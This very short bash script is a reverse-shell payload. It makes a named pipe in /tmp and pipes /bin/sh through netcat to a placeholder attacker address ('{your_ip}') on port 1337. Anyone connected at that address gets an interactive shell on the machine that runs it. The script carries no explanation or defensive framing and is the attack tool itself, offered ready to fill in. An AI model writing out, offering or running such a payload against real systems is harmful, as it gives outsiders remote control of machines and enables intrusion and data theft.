#!/bin/bash

mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc {your_ip} 1337 1>/tmp/backpipe
